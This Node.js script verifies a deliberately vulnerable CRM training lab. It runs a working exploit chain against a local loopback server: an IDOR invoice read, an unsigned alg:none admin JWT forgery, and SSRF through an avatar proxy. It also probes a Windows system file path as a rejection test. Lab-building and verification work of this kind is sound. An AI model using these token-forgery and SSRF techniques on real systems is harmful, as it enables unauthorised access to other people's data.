#!/usr/bin/env node
/**
 * Northwind CRM lab - end-to-end verification.
 *
 * What this script proves:
 *   1. IDOR            - the demo analyst can read invoice 1005, which belongs
 *                        to another user, and receives the idor flag.
 *   2. Token forgery   - an unsigned (alg:none) token with role "admin" opens
 *                        GET /api/admin/flag and returns the admin flag.
 *   3. SSRF            - GET /api/avatar?url= fetches the internal-only
 *                        GET /internal/flag endpoint with the internal service
 *                        credential and returns the ssrf flag.
 *
 * It also asserts the correctly-rejected paths: unauthenticated invoice access,
 * analyst access to the admin flag, the hardened /api/admin/users verifier, the
 * direct (non-proxied) internal endpoint, and avatar URL scheme/host filtering.
 *
 * The script starts its own lab server on 127.0.0.1:4101 (or the next free port
 * when 4101 is already taken), runs the probes with the global fetch API, and
 * always stops the server it started before exiting.
 *
 * Usage: node verify.mjs        (from this directory)
 *        node labs/northwind/verify.mjs   (from the repository root)
 */

import { spawn } from 'node:child_process';
import net from 'node:net';
import os from 'node:os';
import path from 'node:path';
import process from 'node:process';
import { fileURLToPath } from 'node:url';

const LAB_DIR = path.dirname(fileURLToPath(import.meta.url));
const SERVER_PATH = path.join(LAB_DIR, 'server.mjs');
const DESIRED_PORT = 4101;
const PORT_SCAN_LIMIT = 4120;
const BOOT_TIMEOUT_MS = 10_000;
const HTTP_TIMEOUT_MS = 5_000;

const DEMO_EMAIL = 'analyst@northwind.test';
const DEMO_PASSWORD = 'analyst123';

const results = [];
let child = null;
let baseUrl = '';
let serverLog = '';

if (typeof fetch !== 'function') {
  console.error('verify.mjs requires Node.js 18 or newer (global fetch is missing).');
  process.exit(1);
}

function delay(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

function assert(condition, message) {
  if (!condition) throw new Error(message);
}

function pass(name, detail) {
  results.push({ name, ok: true });
  console.log(`PASS  ${name}`);
  if (detail) console.log(`      ${detail}`);
}

function flagFor(text, family) {
  const pattern = new RegExp(`HMW\\{northwind_${family}_[0-9a-f]{6,}\\}`);
  const match = String(text).match(pattern);
  if (!match) {
    throw new Error(`expected an HMW{northwind_${family}_...} flag in the response, got: ${String(text).slice(0, 400)}`);
  }
  return match[0];
}

// ---------------------------------------------------------------------------
// Port + process helpers
// ---------------------------------------------------------------------------
function isPortFree(port) {
  return new Promise((resolve) => {
    const probe = net.createServer();
    probe.unref();
    probe.once('error', () => resolve(false));
    probe.once('listening', () => probe.close(() => resolve(true)));
    probe.listen(port, '127.0.0.1');
  });
}

async function waitPortFree(port, timeoutMs) {
  const deadline = Date.now() + timeoutMs;
  while (Date.now() < deadline) {
    if (await isPortFree(port)) return true;
    await delay(100);
  }
  return false;
}

async function pickPort() {
  for (let port = DESIRED_PORT; port < PORT_SCAN_LIMIT; port += 1) {
    if (await isPortFree(port)) return port;
  }
  throw new Error(`no free loopback port between ${DESIRED_PORT} and ${PORT_SCAN_LIMIT - 1}`);
}

function probeTcp(host, port, timeoutMs = 500) {
  return new Promise((resolve) => {
    const socket = net.connect({ host, port });
    let settled = false;
    const finish = (reachable) => {
      if (settled) return;
      settled = true;
      socket.destroy();
      resolve(reachable);
    };
    socket.setTimeout(timeoutMs);
    socket.once('connect', () => finish(true));
    socket.once('timeout', () => finish(false));
    socket.once('error', () => finish(false));
  });
}

/**
 * The lab must only listen on 127.0.0.1. We prove it by connecting to every
 * non-internal IPv4 address of this host: none of them may answer on the lab
 * port. This works even when child stdio pipes are unavailable.
 */
async function assertLoopbackOnly(port) {
  const externalAddresses = [];
  const interfaces = os.networkInterfaces();
  for (const entries of Object.values(interfaces)) {
    for (const entry of entries || []) {
      if (!entry.internal && String(entry.family) === 'IPv4') externalAddresses.push(entry.address);
    }
  }
  for (const address of externalAddresses) {
    const reachable = await probeTcp(address, port);
    assert(!reachable, `lab server is reachable on non-loopback address ${address}:${port}`);
  }
  return externalAddresses;
}

function startServer(port) {
  const env = { ...process.env, PORT: String(port) };
  delete env.HOST;
  const spawnOptions = {
    cwd: LAB_DIR,
    env,
    windowsHide: true,
  };

  // Prefer piped stdio so the lab banner can be checked and startup failures
  // are diagnosable. Restricted sandboxes may forbid pipe creation for child
  // processes (EPERM); fall back to ignored stdio and rely on the /health probe.
  try {
    child = spawn(process.execPath, [SERVER_PATH], { ...spawnOptions, stdio: ['ignore', 'pipe', 'pipe'] });
    child.stdout.on('data', (chunk) => {
      serverLog += chunk.toString();
    });
    child.stderr.on('data', (chunk) => {
      serverLog += chunk.toString();
    });
  } catch (error) {
    if (!error || error.code !== 'EPERM') throw error;
    child = spawn(process.execPath, [SERVER_PATH], { ...spawnOptions, stdio: 'ignore' });
    serverLog = '(piped child stdio is not permitted in this environment; lab output was discarded)\n';
  }
  child.once('exit', () => {
    /* handled by stopServer / waitForServer */
  });
  return child;
}

async function waitForServer(port) {
  const deadline = Date.now() + BOOT_TIMEOUT_MS;
  while (Date.now() < deadline) {
    if (child.exitCode !== null) {
      throw new Error(`server exited before it became healthy (code ${child.exitCode})\n${serverLog}`);
    }
    try {
      const response = await fetch(`http://127.0.0.1:${port}/health`, { signal: AbortSignal.timeout(1000) });
      if (response.ok) {
        const body = await response.json();
        if (body && body.lab === 'northwind-crm-lab') return body;
      }
    } catch {
      /* not up yet */
    }
    await delay(100);
  }
  throw new Error(`server did not become healthy within ${BOOT_TIMEOUT_MS} ms\n${serverLog}`);
}

async function stopServer() {
  if (!child || child.exitCode !== null) return;
  const exited = new Promise((resolve) => child.once('exit', resolve));
  child.kill();
  const result = await Promise.race([exited.then(() => 'exited'), delay(5000).then(() => 'timeout')]);
  if (result === 'timeout') {
    child.kill('SIGKILL');
    await Promise.race([exited, delay(2000)]);
  }
}

// ---------------------------------------------------------------------------
// HTTP helper
// ---------------------------------------------------------------------------
async function request(method, pathname, options = {}) {
  const headers = { ...(options.headers || {}) };
  let body = options.body;
  if (body !== undefined && typeof body !== 'string') {
    body = JSON.stringify(body);
    headers['content-type'] = 'application/json';
  }
  const response = await fetch(`${baseUrl}${pathname}`, {
    method,
    headers,
    body,
    redirect: 'manual',
    signal: AbortSignal.timeout(HTTP_TIMEOUT_MS),
  });
  const text = await response.text();
  let json = null;
  try {
    json = JSON.parse(text);
  } catch {
    json = null;
  }
  return { status: response.status, headers: response.headers, text, json };
}

function forgeUnsignedToken(claims) {
  const encode = (value) => Buffer.from(JSON.stringify(value), 'utf8').toString('base64url');
  const header = encode({ alg: 'none', typ: 'JWT' });
  const payload = encode(claims);
  return `${header}.${payload}.`;
}

// ---------------------------------------------------------------------------
// Exploit chain
// ---------------------------------------------------------------------------
async function runExploits(port, health) {
  const issuedAt = Math.floor(Date.now() / 1000);
  baseUrl = `http://127.0.0.1:${port}`;

  pass('lab: server is up', `GET ${baseUrl}/health -> 200, lab=${health.lab}, version=${health.version}`);
  const externalAddresses = await assertLoopbackOnly(port);
  const bannerConfirmed = serverLog.includes(`listening on http://127.0.0.1:${port}`);
  pass(
    'lab: binds loopback only',
    `127.0.0.1:${port} answers; ${externalAddresses.length === 0 ? 'no non-loopback IPv4 interfaces to test' : `${externalAddresses.length} non-loopback interface address(es) refused the connection`}` +
      (bannerConfirmed ? '; server banner confirms the 127.0.0.1 bind' : ''),
  );

  // --- Public surface and no flag leakage ---------------------------------
  const loginPage = await request('GET', '/login');
  assert(loginPage.status === 200, `GET /login returned ${loginPage.status}`);
  assert(loginPage.text.includes(DEMO_EMAIL) && loginPage.text.includes(DEMO_PASSWORD), 'login page does not print the demo analyst credentials');
  pass('public: login page renders and prints demo analyst credentials', `GET /login -> 200`);

  const robots = await request('GET', '/robots.txt');
  assert(robots.status === 200 && robots.text.includes('Disallow: /internal'), 'robots.txt is missing or does not disallow /internal');
  pass('public: robots.txt served', `GET /robots.txt -> 200`);

  const appJs = await request('GET', '/static/app.js');
  assert(appJs.status === 200 && appJs.text.includes('/api/avatar?url='), 'static client bundle is missing or incomplete');
  pass('public: static client bundle served', `GET /static/app.js -> 200 (${appJs.text.length} bytes)`);

  const config = await request('GET', '/api/config');
  assert(config.status === 200 && config.json && config.json.token && config.json.token.alg === 'HS256', 'service config is missing');
  pass('public: service config advertised', `GET /api/config -> 200, token.alg=HS256`);

  const unknownApi = await request('GET', '/api/does-not-exist');
  assert(unknownApi.status === 404, `unknown API route returned ${unknownApi.status}`);
  pass('public: unknown API route 404s', `GET /api/does-not-exist -> 404`);

  // --- Correct rejection: bad credentials --------------------------------
  const badLogin = await request('POST', '/api/login', { body: { email: DEMO_EMAIL, password: 'not-the-password' } });
  assert(badLogin.status === 401, `bad password returned ${badLogin.status}`);
  pass('correct rejection: invalid credentials', `POST /api/login (wrong password) -> 401`);

  // --- Analyst login ------------------------------------------------------
  const login = await request('POST', '/api/login', { body: { email: DEMO_EMAIL, password: DEMO_PASSWORD } });
  assert(login.status === 200, `analyst login returned ${login.status}: ${login.text.slice(0, 300)}`);
  assert(login.json && typeof login.json.token === 'string' && login.json.token.split('.').length === 3, 'login did not return a JWT-like token');
  assert(login.json.user && login.json.user.role === 'analyst', 'demo user should have the analyst role');
  const analystToken = login.json.token;
  const analystAuth = { authorization: `Bearer ${analystToken}` };
  pass('auth: analyst demo login', `POST /api/login -> 200, role=${login.json.user.role}, token=${analystToken.slice(0, 24)}...`);

  // --- Correct rejection: unauthenticated invoice access ------------------
  const anonymousInvoice = await request('GET', '/api/invoices/1005');
  assert(anonymousInvoice.status === 401, `anonymous invoice access returned ${anonymousInvoice.status}`);
  pass('correct rejection: anonymous invoice access', `GET /api/invoices/1005 (no token) -> 401`);

  // --- IDOR ---------------------------------------------------------------
  const list = await request('GET', '/api/invoices', { headers: analystAuth });
  assert(list.status === 200 && list.json && Array.isArray(list.json.invoices), 'invoice list failed');
  const ownIds = list.json.invoices.map((invoice) => invoice.id);
  assert(ownIds.includes(1001), 'analyst should own invoice 1001');
  assert(!ownIds.includes(1005), 'the scoped list endpoint must not include invoice 1005');
  pass('idor: baseline list is correctly scoped', `GET /api/invoices -> 200, owned ids=[${ownIds.join(', ')}], 1005 not listed`);

  const idorResponse = await request('GET', '/api/invoices/1005', { headers: analystAuth });
  assert(idorResponse.status === 200, `IDOR read of invoice 1005 returned ${idorResponse.status}: ${idorResponse.text.slice(0, 300)}`);
  assert(idorResponse.json && idorResponse.json.id === 1005, 'IDOR response is not the raw invoice 1005 object');
  assert(idorResponse.json.owner !== DEMO_EMAIL, 'invoice 1005 should belong to a different user');
  const idorFlag = flagFor(idorResponse.text, 'idor');
  pass('IDOR: cross-owner invoice read', `GET /api/invoices/1005 with analyst token -> 200 (owner=${idorResponse.json.owner}, analyst=${DEMO_EMAIL})`);
  console.log(`      FLAG idor: ${idorFlag}`);

  // --- Admin flag: analyst denied ----------------------------------------
  const analystAdmin = await request('GET', '/api/admin/flag', { headers: analystAuth });
  assert(analystAdmin.status === 403, `analyst access to /api/admin/flag returned ${analystAdmin.status}`);
  pass('correct rejection: analyst role on admin flag', `GET /api/admin/flag with analyst token -> 403`);

  // --- JWT forgery: alg:none role:admin ----------------------------------
  const forgedToken = forgeUnsignedToken({
    sub: 'usr_9000',
    email: 'operator@northwind.test',
    name: 'Lab Operator',
    role: 'admin',
    team: 'Platform',
    iss: 'northwind-crm',
    iat: issuedAt,
    exp: issuedAt + 3600,
  });
  assert(forgedToken.endsWith('.'), 'forged token should have an empty signature segment');
  const forgedAdmin = await request('GET', '/api/admin/flag', { headers: { authorization: `Bearer ${forgedToken}` } });
  assert(forgedAdmin.status === 200, `forged admin token returned ${forgedAdmin.status}: ${forgedAdmin.text.slice(0, 300)}`);
  const adminFlag = flagFor(forgedAdmin.text, 'admin');
  pass('JWT forgery: unsigned role:admin token accepted', `GET /api/admin/flag with alg=none token -> 200, scope=${forgedAdmin.json.scope}`);
  console.log(`      FLAG admin: ${adminFlag}`);

  // --- Correct rejection: hardened admin API rejects the forged token -----
  const hardened = await request('GET', '/api/admin/users', { headers: { authorization: `Bearer ${forgedToken}` } });
  assert(hardened.status === 401, `hardened /api/admin/users returned ${hardened.status}, expected 401`);
  assert(!hardened.text.includes('HMW{'), 'hardened endpoint leaked a flag');
  pass('correct rejection: hardened signature check on /api/admin/users', `GET /api/admin/users with forged token -> 401 (stricter verifier)`);

  // --- SSRF ---------------------------------------------------------------
  const directInternal = await request('GET', '/internal/flag');
  assert(directInternal.status === 403, `direct /internal/flag returned ${directInternal.status}, expected 403`);
  assert(!directInternal.text.includes('HMW{'), 'direct internal endpoint leaked a flag without service credentials');
  pass('correct rejection: internal endpoint requires service credentials', `GET /internal/flag (direct) -> 403`);

  const ssrfTarget = `http://127.0.0.1:${port}/internal/flag`;
  const ssrfResponse = await request('GET', `/api/avatar?url=${encodeURIComponent(ssrfTarget)}`, { headers: analystAuth });
  assert(ssrfResponse.status === 200, `SSRF avatar fetch returned ${ssrfResponse.status}: ${ssrfResponse.text.slice(0, 300)}`);
  const ssrfFlag = flagFor(ssrfResponse.text, 'ssrf');
  assert(ssrfResponse.headers.get('x-avatar-source') === ssrfTarget, 'avatar proxy response is missing the x-avatar-source header');
  pass('SSRF: avatar proxy reads internal-only endpoint', `GET /api/avatar?url=${encodeURIComponent(ssrfTarget)} -> 200 (proxied with internal service credential)`);
  console.log(`      FLAG ssrf: ${ssrfFlag}`);

  // --- Correct rejection: avatar URL filtering ---------------------------
  const schemeReject = await request('GET', `/api/avatar?url=${encodeURIComponent('file:///C:/Windows/win.ini')}`, { headers: analystAuth });
  assert(schemeReject.status === 400, `file:// avatar URL returned ${schemeReject.status}, expected 400`);
  const externalReject = await request('GET', `/api/avatar?url=${encodeURIComponent('http://example.com/avatar.png')}`, { headers: analystAuth });
  assert(externalReject.status === 400, `external avatar host returned ${externalReject.status}, expected 400`);
  pass('correct rejection: avatar proxy blocks file:// and external hosts', `file:// -> 400, http://example.com -> 400 (lab is loopback-only)`);

  // --- Flag hygiene: flags never appear in public HTML/assets ------------
  const dashboard = await request('GET', '/dashboard', { headers: analystAuth });
  assert(dashboard.status === 200 && dashboard.text.includes('Enterprise Sales'), 'dashboard page did not render as expected');
  const publicTexts = [
    ['login page', loginPage.text],
    ['dashboard', dashboard.text],
    ['robots.txt', robots.text],
    ['static app.js', appJs.text],
    ['service config', config.text],
    ['health', JSON.stringify(health)],
  ];
  for (const [label, text] of publicTexts) {
    assert(!String(text).includes('HMW{'), `${label} contains a lab flag, which it must not`);
  }
  pass('flag hygiene: no flags in public HTML, config or static assets', 'checked login page, dashboard, robots.txt, app.js, /api/config, /health');

  const flags = { idorFlag, adminFlag, ssrfFlag };
  assert(new Set(Object.values(flags)).size === 3, 'the three flags must be distinct');
  assert(flags.idorFlag.startsWith('HMW{northwind_idor_'), 'idor flag family mismatch');
  assert(flags.adminFlag.startsWith('HMW{northwind_admin_'), 'admin flag family mismatch');
  assert(flags.ssrfFlag.startsWith('HMW{northwind_ssrf_'), 'ssrf flag family mismatch');
  return flags;
}

// ---------------------------------------------------------------------------
// Main
// ---------------------------------------------------------------------------
async function main() {
  console.log('Northwind CRM lab - verification');
  console.log(`node ${process.version} - lab directory: ${LAB_DIR}`);
  console.log('');

  const port = await pickPort();
  if (port !== DESIRED_PORT) {
    console.log(`NOTE  127.0.0.1:${DESIRED_PORT} is already in use; starting the lab on port ${port} instead`);
  }

  startServer(port);
  let exitCode = 0;
  let flags = null;
  try {
    const health = await waitForServer(port);
    flags = await runExploits(port, health);
  } catch (error) {
    exitCode = 1;
    console.error('');
    console.error('VERIFICATION FAILED');
    console.error(`  ${error && error.message ? error.message : error}`);
    if (serverLog.trim()) {
      console.error('');
      console.error('--- server log ---');
      console.error(serverLog.trim());
    }
  } finally {
    await stopServer();
    const released = await waitPortFree(port, 5000);
    if (!released) {
      console.error(`\nWARNING 127.0.0.1:${port} did not become free after stopping the lab server.`);
      exitCode = 1;
    } else {
      const exitDetail = !child
        ? 'process finished'
        : child.exitCode !== null
          ? `exit code ${child.exitCode}`
          : child.signalCode
            ? `terminated (${child.signalCode})`
            : 'process finished';
      pass('lifecycle: lab server stopped', `port ${port} released after ${exitDetail}`);
    }
  }

  console.log('');
  if (exitCode === 0 && flags) {
    console.log(`RESULT: PASS - all three vulnerabilities proven (${results.filter((entry) => entry.ok).length} checks).`);
    console.log(`  IDOR flag:  ${flags.idorFlag}`);
    console.log(`  Admin flag: ${flags.adminFlag}`);
    console.log(`  SSRF flag:  ${flags.ssrfFlag}`);
  } else {
    console.log(`RESULT: FAIL - ${results.filter((entry) => entry.ok).length} checks passed before the failure.`);
  }
  process.exitCode = exitCode;
}

process.on('SIGINT', () => {
  if (child && child.exitCode === null) child.kill();
  process.exit(130);
});

main().catch((error) => {
  console.error('VERIFICATION FAILED (unexpected error)', error);
  if (child && child.exitCode === null) child.kill();
  process.exitCode = 1;
});
